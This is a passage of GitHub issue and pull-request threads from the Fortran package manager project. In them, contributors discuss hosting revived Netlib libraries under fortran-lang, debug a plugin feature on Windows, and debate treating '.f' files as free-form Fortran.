                    "text": "@ivan-pi\n\nI don't like the idea of a deprecated/ folder tied to language features. For example the Fortran 2018 standard made the forall statetement obsolescent. Would \"good programming practice\" dictate I should move all my free-form F95+ programs containing the forall construct into a different folder? I don't think so.\n\nI respect your opinion. I beg to differ: phasing out obsolescent features it's a healthy practice as long as it is managed not too abruptly, but we need to move on. IMO, exactly the fear of a too hasty language modernisation made Fortran adoption, usage and fields of application continuously shrink in the past couple of decades.\nMore specifically, I don't believe that we have to align to the standard specifications 100%. If, for example, forall is voted by the community as a useful modern default feature, we can keep it."
                },
                {
                    "user": "ivan-pi",
                    "date": "2021-02-24 15:56:01+00:00",
                    "text": "@epagone,\nI should clarify, I am not necessarily against a folder with implicit fixed-form flag. In fact, I also adopt this type of convention when packaging legacy codes, e.g. https://github.com/ivan-pi/y12m/tree/main/src. But I am against mixing what is the fixed-/free- form issue, with the issue of deprecated and deleted language features.\nWhile I can relate strongly to your sentiment, about Fortran needing to move on (in 2017 my professors where still teaching in a basic F90 style with external subroutines and no modules), I maintain a skeptical attitude towards an alleged drop in Fortran adoption and usage.\nWhile Fortran might not be in the limelight anymore as a general purpose computing language, it still maintains high presence at most HPC centers. The fact the field of applications shrunk is not necessarily a bad thing, simply meaning that other programming languages (some of them influenced by Fortran) which were more suitable for those tasks appeared. From 1960 until 2020 the world population grew from 3 billion to 7.8 billion, and so did the computer penetration among all societal units (households, government organizations, companies, etc.). I find it hard to believe the total number of Fortran programmers would have gone down in the same period, even if the rate of growth might have decreased. I would echo @certik's words in a thread at Discourse:\n\nFortran has not realized its full potential. If we can realize Fortran\u2019s full potential, I think it will be a better language for scientific computing than Python."
                },
                {
                    "user": "epagone",
                    "date": "2021-02-24 16:07:20+00:00",
                    "text": "I think this branch of the discussion is definitely OT here (I should have replied in the other issue but, in a hurry, I was carried away, apologies). Anyway, I only partially agree with what you said but I am not in the position to provide a meaningful answer now because it touches several broader topics. A \"face to face\" conversation might be more effective and, if tomorrow there is time, it would be a good opportunity. I will stop here because we are OT."
                },
                {
                    "user": "ivan-pi",
                    "date": "2021-02-24 16:26:56+00:00",
                    "text": "My apologies for getting carried away and derailing the thread too. I will join the call tomorrow. \ud83d\udc4d"
                }
            ]
        },
        {
            "number": 365,
            "user": "certik",
            "date": "2021-02-19 16:50:48+00:00",
            "title": "Proposal: maintain packages collectively at https://github.com/fortran-lang",
            "text": "Fortran has many legacy packages, living at netlib and other places. Recently people have started resurrecting them. Initially people just provided a modern build system and ensured they build with recent compilers, examples of that would be:\n\nhttps://github.com/certik/minpack\n\nLately, people have started providing fpm build system for them, an example:\n\nhttps://github.com/ivan-pi/LINPACK\nhttps://github.com/ivan-pi/y12m\nhttps://github.com/ivan-pi/SMMP\nhttps://github.com/ivan-pi/fortran_lsp\n\nProposal: I propose that we allow to move such packages to the https://github.com/fortran-lang organization at GitHub.\nHere is how Rust does it:\n\nhttps://github.com/rust-lang\n\nThey have the core Rust packages (such as the compiler, package manager, etc.), but then they also have just Rust packages that they maintain collectively.\nFor Fortran this is even more natural: there are hundreds of existing packages / libraries / tools in Fortran that are abandoned and many of them are high quality. I can attest for example that both MINPACK and FFTPACK are high quality packages, FFTPACK for example even to this day competes very well in terms of performance (often within a factor of 2x against optimized FFTW). By maintaining them as a community under the fortran-lang organization we can effectively resurrect them, making them readily available using fpm and give them visibility and support as a community.",
            "comments": [
                {
                    "user": "certik",
                    "date": "2021-02-19 16:56:12+00:00",
                    "text": "Another thing to discuss is what kind of packages to host. I would propose any package that is abandoned and we are just resurrecting it. For packages that already have an active home somewhere else, such as https://github.com/opencollab/arpack-ng, we can leave those there (although they are certainly welcome to move under the fortran-lang umbrella if they wanted).\nFinally, for new packages that somebody writes from scratch, we will have to create some criteria, perhaps having at least 2 contributors or something like that."
                },
                {
                    "user": "awvwgk",
                    "date": "2021-02-19 17:05:07+00:00",
                    "text": "I like the idea of having community maintained Fortran packages here at @fortran-lang. What are the criteria to have an officially @fortran-lang hosted Fortran project (maybe even independently from being resurrected or newly created)? What minimal standards do we set for such a project?"
                },
                {
                    "user": "awvwgk",
                    "date": "2021-02-19 17:05:47+00:00",
                    "text": "Rust also has a https://github.com/rust-lang-nursery to create new Rust packages. For now there is probably no need for such a staging area in @fortran-lang. Also, we might not want follow this line of thought too closely when deciding on a namespace for resurrected Fortran packages."
                },
                {
                    "user": "ivan-pi",
                    "date": "2021-02-19 17:10:29+00:00",
                    "text": "I added two more packages to your list, also from Netlib with added fpm support.\nWhile I would like to see these codes flourish again, there are some challenges with the old Netlib codes:\n\nmany have gaps in their support for different real kinds (precisions are either single or double, sometimes both)\nsome require refactoring due to non-standard Fortran practices\nmost of them come with no interface module. Maybe a module with the external interfaces and potentially even intent attributes should be a minimum before they can be accepted into the collective. (\ud83d\ude22 maybe I will drop LINPACK.)\ndocumentation are just plain old text files\nlicensing terms are often not clear. While some are in the public domain, this is not good enough in certain jurisdictions."
                },
                {
                    "user": "awvwgk",
                    "date": "2021-02-19 17:29:12+00:00",
                    "text": "Keep in mind even on GitHub codes can die (to extend the where Fortran codes go to die metaphor), I have seen plenty of those already and also resurrected some.\nResurrecting a project is one thing, but making it useful is much more difficult, good documentation and examples are required for ones, availability is another issue (this will be solved by fpm). Than there might also be a performance issue with some of them. Let's take LINPACK as example, which has been rightfully superseded by LAPACK. There is almost no reason to built a project on LINPACK today, which could use the LAPACK API instead and profit from tuned libraries like MKL as well. If we resurrect a project based on LINPACK, what are the performance implications for such a project?"
                },
                {
                    "user": "certik",
                    "date": "2021-02-19 17:56:31+00:00",
                    "text": "Good points @ivan-pi and @awvwgk. I am glad you raised them.\nPerhaps we should aim to only include projects that will become useful. As an example we can maintain an fpm package for LAPACK (whose upstream sources would stay at https://github.com/Reference-LAPACK/lapack)."
                },
                {
                    "user": "awvwgk",
                    "date": "2021-02-19 18:00:53+00:00",
                    "text": "Perhaps we should aim to only include projects that will become useful. As an example we can maintain an fpm package for LAPACK (whose upstream sources would stay at https://github.com/Reference-LAPACK/lapack).\n\nLAPACK is special in many regards, I would go so far to say that I never want to include LAPACK as fpm package but always by linking against an external library to actually make use of tuned libraries like MKL (see #330 for a related discussion)."
                },
                {
                    "user": "certik",
                    "date": "2021-02-19 18:07:30+00:00",
                    "text": "@awvwgk yes, that was a bad example, indeed I would like a special support for Lapack in fpm (#368) as well as for MPI (#354).\nFFTPACK would be a better example then. Or ARPACK (with upstream sources at https://github.com/opencollab/arpack-ng)."
                },
                {
                    "user": "ivan-pi",
                    "date": "2021-02-19 18:57:35+00:00",
                    "text": "Let's take LINPACK as example, which has been rightfully superseded by LAPACK. There is almost no reason to built a project on LINPACK today, which could use the LAPACK API instead and profit from tuned libraries like MKL as well. If we resurrect a project based on LINPACK, what are the performance implications for such a project?\n\nI agree new projects don't need LINPACK at all. My interest in the LINPACK routines was primarily due to a calling library by Sabine Van Huffel (see http://www.netlib.org/vanhuffel/readme), author of the book on Total Least Squares (TLS) Problems (the book has 1992 citation according to Google Scholar). According to her readme file, the routines have a LINPACK dependency. Ideally, sooner or later me or some other interested Fortranners would replace the LINPACK routines with the equivalent LAPACK ones (I have done this before in a different project).\nJust for comparison both Julia and Python both have easily accessible packages for TLS:\n\nTotalLeastSquares.jl\nscipy.odr (wrapper of ODRPACK from Netlib)\n\nI agree with both of your comments about LAPACK requiring special integration. This will also be crucial once we get to the point of calling LAPACK in stdlib."
                },
                {
                    "user": "awvwgk",
                    "date": "2021-02-19 19:04:15+00:00",
                    "text": "Another package that might be interesting here is MUDPACK, this is currently actively used in @dftbplus and redistributed with the code base. There would be at least one user for a resurrected MUDPACK.\nOther legacy projects are probably used in a similar fashion, embedded or redistributed in existing modern code bases."
                }
            ]
        },
        {
            "number": 364,
            "user": "urbanjost",
            "date": "2021-02-19 03:26:20+00:00",
            "title": "plugin alpha version",
            "text": "This is a reconstituted  PR for an alpha version supporting plugins.  previous comments are very valuable and should be looked at in closed PR #362.  There were issues with rebasing the original PR to merge into the latest master and it was easier to just reintroduce the changes in the code.",
            "comments": [
                {
                    "user": "brocolis",
                    "date": "2021-02-19 03:58:29+00:00",
                    "text": "Thank you @urbanjost . It works nicely on Windows 10."
                },
                {
                    "user": "brocolis",
                    "date": "2021-02-21 09:10:13+00:00",
                    "text": "I ran into issue if the current directory contains a subdirectory named \"fpm\". If I rename the \"fpm\" subdirectory, it works."
                },
                {
                    "user": "urbanjost",
                    "date": "2021-02-21 22:00:31+00:00",
                    "text": "I have not been able to reproduce this. what is the value of your PATH environment variable and what is the path to the fpm-search program?  I am missing what could cause that behavior so I will probably need to ask you to build a test version.  Do you have more than one fpm command in your path? Was one of them in that fpm/ directory?  If you switched versions that could explain it."
                },
                {
                    "user": "brocolis",
                    "date": "2021-02-22 00:50:54+00:00",
                    "text": "what is the value of your PATH environment variable\n\nset path=C:\\Tools;C:\\Dev\\MinGW-10.2.0-x64\\bin\n\nwhat is the path to the fpm-search program?\n\nC:\\Tools\\fpm-search.exe\n\nI am missing what could cause that behavior so I will probably need to ask you to build a test version.\n\nOK.\n\nDo you have more than one fpm command in your path? Was one of them in that fpm/ directory?\n\nNo."
                },
                {
                    "user": "urbanjost",
                    "date": "2021-02-22 02:06:47+00:00",
                    "text": "I made a single-file fpm package that creates a debug version of fpm. I think the output will have a good chance of showing what went wrong:\ngit clone https://github.com/urbanjost/bootstrap\ncd bootstrap\nfpm run -- search\nThat is, it should make a program called bootstrap that is a version of fpm. You might have to install the binary where you installed your version of fpm to duplicate the problem(?)\nYou can also just \"gfortran bootstrap/app/main.f90 -o fpm\" since it is a single file.\nSo if you can just compile and load that single file and temporarily replace your fpm command which the new version that might be the simplest."
                },
                {
                    "user": "brocolis",
                    "date": "2021-02-22 02:51:53+00:00",
                    "text": "Hi @urbanjost.\nI've installed the binary into C:\\Tools then I ran set path=C:\\Tools;C:\\Dev\\MinGW-10.2.0-x64\\bin\nbootstrap search works\n\nIf I cd to a directory that contains a subdirectory named \"bootstrap\", then bootstrap search  fails"
                },
                {
                    "user": "urbanjost",
                    "date": "2021-02-22 05:57:11+00:00",
                    "text": "Thanks! Should work now."
                },
                {
                    "user": "brocolis",
                    "date": "2021-02-22 09:04:32+00:00",
                    "text": "Yes, it works now. Thanks!."
                },
                {
                    "user": "urbanjost",
                    "date": "2021-02-23 17:29:01+00:00",
                    "text": "As @LKedward mentioned in #362,  the current file structure prevents fpm(1) from being used as an fpm(1) package, and that would be easy to change.\nIn addition to the reasons proposed I think for this fpm-NAME subpackage support to be most useful some of the independent apps that could result (such as a snapshot of fpm-search) could be distributed as part of the package with a pure fortran single-file bootstrap version of fpm.\nSo another example might be the new subcommand could remain with basic features, but variants of fpm-init could exist that like the D language package manager prompt you though building a more elaborate setup; or could let you select from the templates on the web page; ...\nSomeone might like to make an fpm-license command so you could enter \"fpm license MIT\" and create a LICENSE file.\nSo if it were a package and you wanted to upgrade or get a specific version it could be a matter of and fpm update and fpm install;  if a new user you get the repository,  cd into it and enter 'gfortran bootstrap/fpm.f90 -o fpm;./fpm install;rm ./fpm' or something close to that.  That could easily be distributed in a tar file for someone on a stand-alone system that just had git(1) and gfortran(1).\nHaskell fpm (h-fpm) can still build packages with fpm.mk and CLI options for loading and linking  that Fortran fpm (f-fpm)  lacks\nand Haskell has a number of standard features that make interacting with the OS easier (until stdlib supplies the equivalent of a POSIX interface for Windows?)  and such so I am wondering how they would best co-habitate but I would like to see fpm as an fpm package at least as a beta.\nSo is it time to have the fledgling leave the nest and have an fpm package for fpm,  as proposed?\no could allow for the engine to be used as a library; which could allow for modular development of package builders,\nTUI and GUI interfaces, ... if a standard interface is defined (and allowing for calling fpm-NAME as is done with git(1)\nand cargo(1) would allow for very transparent use of the subpackages).\no allow for building f-fpm with just git and gfortran installed\no not sure about handling the documentation and examples that are currently \"above\" the f-fpm fpm/ directory.  To support f-fpm and h-fpm should at least the version-specific files be branched?"
                },
                {
                    "user": "milancurcic",
                    "date": "2021-03-16 13:53:05+00:00",
                    "text": "@urbanjost Are you available for this month's video call? It'd be good to discuss this PR broadly and I'd like to see it go forward. If not, and if you agree, I'd like to present and discuss this PR for you."
                },
                {
                    "user": "urbanjost",
                    "date": "2021-03-17 04:40:06+00:00",
                    "text": "Very unlikely I will make the meeting, so feel free to discuss it.\nA few thoughts that might be interesting but very preliminary --\nI cloned the fpm repository partly to test fpm-search using an alternate repository but also because I was toying with the idea of making a \"plugin\" repository with (aware of the catch-22) fpm-search, maybe fpm-single, fpm-man (being what I called fman and fan), a bash shell to get and install a plugin assuming it is an fpm package (which is potentially very limiting) and looking at using \"fpm build --show-model\" as a way to simulate making plugins model aware to play with the concept. If fpm becomes a package soon that would be easier; but without a firmly defined interface that is just an experment..\nSo I see a richer support of plugins as potentially quite powerful. I think it could be used to develop features early that could be very system-dependent without polluting the core Fortran fpm functionality (you could have an fpm-cmd for Linux and for WIndows that did the same thing but used gfortran extensions or OS-specific commands more liberally than I would like to see fpm do directly (except via stdlib) and so on.\nfpm-search is by far the best example so far; but fpm-single is an indication there is more potential there.\nIn any case no matter what the direction just allowing fpm-cmd to be called as \"fpm cmd\" gets the ball rolling. That is somewhat trivial by itself  (you could of course just call the command \"fpm-cmd\") but with some kind of way of being able to query the model\nyou could picture things like \"fpm format\" calling a reformatting program on the source files;  or \"fpm edit PROCEDURE\" taking you into your editor on the file containing the routine and so on.\nI have a alpha-alpha program called fpm-shell that lets you run the built-in commands in an \"fpm shell\" where you can call the subcommands without a prefix and plugins too that is an interesting plug-in.\nThese are just rough ideas to play with at this point, and plugins are supported but do not seem to be a big component of other package managers; which is offsetting -- but supporting a modular model for fpm seems promising so I am behind anyone that wants to advocate for it. Maybe it will just allow for a simple way to prototype functions that will ultimately become core fpm commands but I think that will allow for faster fpm development too so go for it. Wondering if anyone has strong opinions on this before the meeting.  That would be interesting to hear."
                },
                {
                    "user": "LKedward",
                    "date": "2021-03-24 15:11:32+00:00",
                    "text": "Apologies for the delay with this PR; I am in support of this approach but haven't yet had a chance to look at it in detail and play around with it.\nAlso, as noted above, fpm needs restructuring before plugins can properly access the model, but there are no fundamental blockers on why this can't be done now. I would advise against trying to parse the output of fpm --show-model to access the model."
                },
                {
                    "user": "milancurcic",
                    "date": "2021-03-29 14:28:30+00:00",
                    "text": "@urbanjost we discussed this PR on the call, you can see it here (relevant discussion at about 42:45). Overall there was support for this approach going forward, with some suggestion for improvement, such as not searching for plugin executable in the global PATH, but perhaps only in a specific directory that is not in the PATH."
                },
                {
                    "user": "urbanjost",
                    "date": "2021-04-02 02:09:31+00:00",
                    "text": "I have a which(3f) function that uses ISO_C_BINDING interfaces to POSIX routines that checks execute permission, but did not have an equivalent for other systems so I simplified which(3f) so it just tests for file existence, which can be done with pure Fortran. I am assuming that stdlib will provide such a function in the future. I started a separate module in my private files called M_OS where I was experimenting with the reliability of separator, the reliability of testing for certain theoretically OS-specific files, environmental variables and other ways to emulate the uname(3f) POSIX function but have not had the time recently to pursue that, put in my own projects I have found that separator is useful of itself, particularly in MSWIndows where old tricks like testing for the directory ./ no longer work as POSIX and DOS filepaths are sometimes both supported. If fpm is assumed to require gfortran there are gfortran extensions that can be used to solve all those issues. Essentially, the M_OS module is just a module whose purpose is to determine OS-specific information (what file separator should I use, what OS am I using (letting me assume certain commands will be available, for example). Considering in the POSIX world I just call uname(1) it is surprisingly complex to just say \"where am I\" in a really robust way.\nSo I am aware of the limitations but felt this was sufficient for an initial prototype. A plugin becomes potentially much more powerful if it can use fpm(1) as a package.  This prototype is essentially laying some groundwork for exploring the possibilities\nof a modular project environment. If a well-defined API is defined for even a few parts of the core pure-Fortran core of fpm then\nyou could do things like have separate programs for different OSes for other functions but still let the user interface with fpm as an integrated package, for example.  As-is, it is really just providing an alias for a command but I think it has intriguing potential for allowing functions such as search, GUI interfaces, and system-dependent functions to develop in parallel with the core functionality. And at this point it  is essentially transparent and can be ignored by users of the core functionalities."
                },
                {
                    "user": "milancurcic",
                    "date": "2021-05-24 16:00:31+00:00",
                    "text": "@urbanjost, I think there is a strong consensus to move this PR forward. Do you need help resolving the conflicts?"
                },
                {
                    "user": "urbanjost",
                    "date": "2021-05-31 23:18:10+00:00",
                    "text": "Been gone for a bit.\nI cannot use github to resolve the conflicts or to look at them. Everything having to do with the conflicts appears to be grayed out.\nIs there a button I am missing somewhere?  I want to evolve this into something that can see the fpm model via an API but starting with this is a reasonable first step and should be upward-compatible with any such feature."
                }
            ]
        },
        {
            "number": 363,
            "user": "certik",
            "date": "2021-02-17 00:25:33+00:00",
            "title": "Reclaiming `.f` file extension for modern Fortran (free form)",
            "text": "This was first seriously suggested here:\n#359 (comment)\nThis deserves an issue of its own. Let's discuss the pros and cons, here is a start:\nCons\n\nChange of established (by now) conventions to use .f for fixed-form and .f90 for free-form (see @sblionel's post for the history of this). Thus creating even more confusion.\nSyntax highlighting in Vim, GitHub, etc. might be incorrect for free-form code in .f files\nSome existing Fortran users might be disappointed with this choice\nWhile this can be implemented in fpm easily, it might break some other existing tools around Fortran\n\nPros\n\n.f is a nice extension, natural for Fortran\nIt does not have 90 in the name, thus nothing \"old\" about it\nWriting fixed-form is not recommended for new projects, so the default good extension should be reserved for free-form, rather than fixed-form\nNew Fortran users might like this new extension more\n\nRelevant other issues: #250, #359.",
            "comments": [
                {
                    "user": "everythingfunctional",
                    "date": "2021-02-17 00:39:02+00:00",
                    "text": "A comment about the syntax highlighting is that (at least locally), it can be changed without too much effort to still treat .f as free-form Fortran. For every editor I've seen the relationship between a file extension and it's format is an easily customizable mapping. And if this convention catches hold we may start to see the defaults changed as well. A big shift like this has to start somewhere."
                },
                {
                    "user": "rouson",
                    "date": "2021-02-17 00:41:37+00:00",
                    "text": "@certik because the standard is silent on file extensions, I assume that the goal is to influence compiler developers. Recent compiler support surveys by Chivers and Sleightholme track 10 compilers. That seems like a lot of people to influence and therefore a big effort.  I imagine it might face less resistance to propose a new extension that's not widely used.  One approach might be for the developer community to add support for the new extension in open-source compilers and then get some projects to adopt to the new extension if those projects only care about compiling with the open-source compilers.  That might go a long way toward demonstrating to the vendors that the community wants and supports the idea.\nSome suggestions:\n\n.fsf for \"free source form\" (which unfortunately could be mistakenly expanded to \"fixed source form\"),\n.mf for \"modern Fortran\" (along with other fun, unsavory interpretations),\n.mofo also for \"modern Fortran\" (and also with fun, unsavory interpretations), and\n.fo which is almost as short and sweet as .f but without the baggage of any suggested so far."
                },
                {
                    "user": "certik",
                    "date": "2021-02-17 00:44:32+00:00",
                    "text": "@rouson thanks for the comment. This issue is for fpm to simply treat .f files as free-form which we can implement easily, and fpm would then use the appropriate compiler option for all existing commercial and open source compilers. So there is no technical issue from this perspective as far as I can tell, and compilers do not need to change their defaults. It is more of a symbolic issue, but see the other Cons above."
                },
                {
                    "user": "everythingfunctional",
                    "date": "2021-02-17 00:53:52+00:00",
                    "text": "I'm not sure I'd ever expect the compilers to change their default behavior for .f. They have far too many existing users to support that aren't interested in updating their code or migrating to fpm. But the rest of us can leave those user's behind and influence new tools to make our lives easier. (not that file extension is a burden at all).\nBut if we wanted to invent a new extension, I might go with .fm - Fortran, modern."
                },
                {
                    "user": "certik",
                    "date": "2021-02-17 01:19:21+00:00",
                    "text": "@everythingfunctional to reformulate what you said, we are not leaving the users behind, I can easily imagine we would add a simple option to fpm.toml to treat .f as fixed-form for people who prefer that."
                },
                {
                    "user": "rouson",
                    "date": "2021-02-17 01:36:35+00:00",
                    "text": "Now that I understand the aim better, this proposal makes more sense -- although I'd still suggest choosing something new rather than overloading something well-established.  I have a new suggestion: .fpm, which of course indicates that the file is to be built by fpm, which, for the foreseeable future, is the only build system that will recognize whatever new extension is chosen.  As a bonus, it can also be interpreted as \"Fortran program, modern.\""
                },
                {
                    "user": "everythingfunctional",
                    "date": "2021-02-17 15:16:42+00:00",
                    "text": "@certik , yeah, that statement was a bit hyperbolic. We do of course want to have an option to revert back to the old ways, if for know other reason than to make the transition easier for users wishing to adapt older code to use fpm.\nI do like @rouson suggestion of .fpm. Not quite as much as .f, but close."
                },
                {
                    "user": "awvwgk",
                    "date": "2021-02-17 15:36:34+00:00",
                    "text": "After spending a whole day filing bug reports due to new compiler and build systems releases, I'm not sure what gain we are expecting by deviating from existing conventions for file extensions. File extensions outside of the range of f and f90 will most likely introduce breakage down the line with either compilers and/or other build systems, which can become hard to debug once fpm allows to automatically export those build files."
                },
                {
                    "user": "epagone",
                    "date": "2021-02-17 16:27:57+00:00",
                    "text": "@certik I will consider the cons one by one.\n\n* Change of established (by now) conventions to use `.f` for fixed-form and `.f90` for free-form (see @sblionel's [post](https://stevelionel.com/drfortran/2013/01/11/doctor-fortran-in-source-form-just-wants-to-be-free/) for the history of this). Thus creating even more confusion.\n\n\nI agree and I like that you correctly mention \"by now\", i.e. it can be only a transitory confusion \u263a\ufe0f . I think that this is the only major issue that I personally have. However, if we decide to make this brave move, I think .f minimises the confusion in comparison to any other alternative \"new\" extension for free form.\n\n* Syntax highlighting in Vim, GitHub, etc. might be incorrect for free-form code in `.f` files\n\n\nFair point, but not really a big deal as already explained by @everythingfunctional above in a better way than I could.\n\n* Some existing Fortran users might be disappointed with this choice\n\n\nI'm not sure that I understand what you mean. I suspect that the real \"con\" can be understood investigating the cause of such disappointment.\n\n* While this can be implemented in `fpm` easily, it might break some other existing tools around Fortran\n\n\nI think this is a \"pro\" \ud83d\ude04 Please let me explain. If I am not wrong, one of the main motivations to start fpm in the first place was to relieve the burden off the shoulders of Fortraneers caused by using messy, hacky or complex solutions to build and distribute their code. For example, cmake is an amazing tool that can even calculate ray tracing but it is definitely not easy to master. In a sense, existing tools, are already \"broken\" because they require considerable effort to the average Fortran coder. fpm would solve this issue discouraging (mostly newcomers) to adopt other tools that do not support Fortran very well, saving frustration down the line.\nI think that @awvwgk's experience in the comment above reinforces some of these points."
                },
                {
                    "user": "epagone",
                    "date": "2021-02-17 16:30:34+00:00",
                    "text": "However, as the originator of the idea, I would like to point out that my aspiration is broader than \"just\" reclaiming .f (although at the moment it is the most \"visible\" proposal): I'd like to remove the legacy ties that make Fortran be recognised as a language stuck in the past, even just with purely cosmetic changes (e.g. what is the big deal in typing \"implicit none\" here and there?). Please have a look at the first post of the linked issue and feel free to suggest if there is any modern feature that can be \"activated\" by appropriate flags and that I have not considered."
                },
                {
                    "user": "awvwgk",
                    "date": "2021-02-17 17:12:54+00:00",
                    "text": "While this can be implemented in fpm easily, it might break some other existing tools around Fortran\n\n\nI think this is a \"pro\" smile Please let me explain. If I am not wrong, one of the main motivations to start fpm in the first place was to relieve the burden off the shoulders of Fortraneers caused by using messy, hacky or complex solutions to build and distribute their code. For example, cmake is an amazing tool that can even calculate ray tracing but it is definitely not easy to master. In a sense, existing tools, are already \"broken\" because they require considerable effort to the average Fortran coder. fpm would solve this issue discouraging (mostly newcomers) to adopt other tools that do not support Fortran very well, saving frustration down the line.\n\nWhile I for sure enjoy to deliberately break existing tool chains (usually with benign intentions to improve the overall robustness), it's not something I would put up as a project aim.\nThere is a worth in build systems like meson and CMake and I wouldn't call them broken for Fortran. Especially meson comes with a powerful project management system which allows to easily reuse code, which is no worse for Fortran than for C++. CMake has its particularities, but those are not aimed against Fortran, they are available for all supported programming languages on equal footing. I certainly don't enjoy writing CMake build files because it requires a lot of boilerplate I get for free in meson, but the resulting build system is solid across platforms and compilers which enables to focus on the important task at hand: writing better software.\n\nOn the actual topic of reclaiming the f extension for free format source code. There are already huge Fortran projects, like Vasp and Turbomole, that use only f as extension for their Fortran source, which is mostly free format. Obviously there has to be a way to still use fixed format source code in such a huge code base from the past decades. This is usually done manually in a huge Makefile.\nFor new projects this is less of a problem, so adopting f as default extension would work, with the minor annoyance of having to get the free-format argument right for every supported compiler."
                },
                {
                    "user": "epagone",
                    "date": "2021-02-17 17:27:00+00:00",
                    "text": "While I for sure enjoy to deliberately break existing tool chains (usually with benign intentions to improve the overall robustness), it's not something I would put up as a project aim.\nThere is a worth in build systems like meson and CMake and I wouldn't call them broken for Fortran. Especially meson comes with a powerful project management system which allows to easily reuse code, which is no worse for Fortran than for C++. CMake has its particularities, but those are not aimed against Fortran, they are available for all supported programming languages on equal footing. I certainly don't enjoy writing CMake build files because it requires a lot of boilerplate I get for free in meson, but the resulting build system is solid across platforms and compilers which enables to focus on the important task at hand: writing better software.\n\nI think that we are saying the same exact thing (maybe from a different point of view): CMake and meson work really well (but also Autotools, once everything has been set up properly, ok except it's not cross platform, but I hope you'll get the point in a second). The problem is exactly writing all the necessary boilerplate that does not let you focus on writing better software.\nIf we had already a valid, good all-around Fortran build system, why on Earth are we going the long way to build fpm from scratch?\nBTW, thanks for the examples and the links: I was not aware of Vasp and Turbomole. It gives me a lot of hope!"
                },
                {
                    "user": "awvwgk",
                    "date": "2021-02-17 17:56:34+00:00",
                    "text": "If we had already a valid, good all-around Fortran build system, why on Earth are we going the long way to build fpm from scratch?\n\nBecause it's fun.\nWhy would somebody take on the effort to write meson in the first place when there was CMake and autotools around? The Gnome project now moved completely from autotools to meson, so maybe meson was a good idea and offered something you wouldn't get in autotools. If you look at meson you will notice it can do so much less than CMake, meson is not turing complete like CMake, there is no real reason to use meson, except that meson build files require a fraction of the lines you would write for the equivalent CMake project while you still can do 90% of your usual tasks with ease.\nSo what's up with fpm? Why would we choose a configuration file format like TOML as input over a powerful DSL like offered by meson? If you need the DSL of meson to express non-trivial dependencies in your project, fpm will hardly ever become a real alternative, but if you want to prototype, you can get away with a single line in your fpm.toml input and start immediately.\nThere is a gap fpm can fill for Fortran, it won't replace CMake or meson, at least in my opinion, but maybe it will allow us to seamlessly integrate with existing CMake and meson projects instead of fracturing the Fortran community with yet another build system (remember FoBiS, foray, ...?)."
                },
                {
                    "user": "epagone",
                    "date": "2021-02-17 18:38:50+00:00",
                    "text": "There is a gap fpm can fill for Fortran, it won't replace CMake or meson, at least in my opinion, but maybe it will allow us to seamlessly integrate with existing CMake and meson projects instead of fracturing the Fortran community with yet another build system (remember FoBiS, foray, ...?).\n\nThe fpm interface to CMake or meson is still entirely to be written and mostly to be designed, AFAIK. I can't remotely see why there is a risk of \"fracturing the Fortran community\" if fpm assumes by default that .f is free from and then the back-end converts appropriately this to CMake, for example (heck, it's just a matter of adding a compiler flag in CMakeLists.txt).\nI really do not understand so much concern. Am I missing something?"
                },
                {
                    "user": "milancurcic",
                    "date": "2021-02-17 19:15:46+00:00",
                    "text": "@awvwgk @epagone\nAll these other build systems that you discuss--CMake, Meson, autotools--are (mostly) language agnostic.\nfpm is language specific. It's exactly what Fortran lacks and needs. Just like Cargo for Rust.\nWe didn't start with the question how can we make CMake, Meson, or autotools, but better. We started with the question, what is it that Fortran needs? What will make a Fortran programmer happier? With special attention to new Fortran programmers, an endangered and almost extinct species.\nTry giving CMake or autotools to somebody new to these tools and watch them pull their hair out for a week straight. Let's face it, unless you dug your way through the mud and became an expert, using them sucks. I can't speak for Meson.\nThese tools are also not package managers but build systems, as far as I understand them.\nSo fpm does not aim to replace these tools. It's more orthogonal than competitive with them. Projects that need them will continue using them. You already don't need these tools for most new Fortran projects, and experience is vastly superior IMO.\nSure, designing and building fpm is a lot of fun. But saying we do it just for fun is misleading."
                },
                {
                    "user": "awvwgk",
                    "date": "2021-02-17 19:19:05+00:00",
                    "text": "Sure, designing and building fpm is a lot of fun. But saying we do it just for fun is misleading.\n\nI should have worded it better:\nBecause it makes programming Fortran fun."
                },
                {
                    "user": "milancurcic",
                    "date": "2021-02-17 19:23:43+00:00",
                    "text": "I wrote more on how I see the role of fpm in Understanding intent."
                },
                {
                    "user": "epagone",
                    "date": "2021-02-17 19:30:20+00:00",
                    "text": "Just two quotes to go back to the pros and cons of the discussion:\n@awvwgk wrote:\n\nI certainly don't enjoy writing CMake build files because it requires a lot of boilerplate\n\n@milancurcic wrote:\n\nTry giving CMake or autotools to somebody new to these tools and watch them pull their hair out for a week straight. Let's face it, unless you dug your way through the mud and became an expert, using them sucks.\n\nI totally agree with both and, from my standpoint, this is enough to \"take home\" the message that if we break direct compatibility with such tools is not a \"con\": they are already complicated, require time, effort and attention regardless. Plus, if we develop the relevant back-ends, the problem evaporates entirely.\nSaid that, I realise that I have been imprecise with my my wording and I am sorry if I might have also sounded too provocative (it was not my intention)."
                },
                {
                    "user": "vmagnin",
                    "date": "2021-02-17 20:03:20+00:00",
                    "text": "Try giving CMake or autotools to somebody new to these tools and watch them pull their hair out for a week straight. Let's face it, unless you dug your way through the mud and became an expert, using them sucks. I can't speak for Meson.\n\nMy experience is that CMake is very powerful but complicated (and verbose). Meson is more simple to use, with a Python like syntax (fpm seems to be of the same family, and I like that). Although Meson is quickly evolving, it still does not install correctly the .mod Fortran files. I tried migrating gtk-fortran to Meson  but I was blocked by that problem. It's multi-language and Fortran is not a priority.\nWhat I like in fpm is that it is totally oriented toward Fortran. It is simple to use, with a clear syntax. It is perfect for launching small projects (probably it will soon be OK for bigger projects). But the fpm killer feature is of course the way it can manage dependencies:  already, being able to automatically git clone other fpm projects is awesome. But if it becomes able to do that with CMake or Meson, wow! That's what Fortran needs to cure its scattered ecosystem.\nTo return to the subject, I have divided opinions about the .f90 problem. I have no experience of compiling old .f files from big libraries. I have always modernized old code written in my team when confronted to Fortran 77 codes (typically a few thousands lines). So I can't say much. Only that I am not sure .f90 is a so important problem. I don't know."
                },
                {
                    "user": "certik",
                    "date": "2021-02-17 22:46:34+00:00",
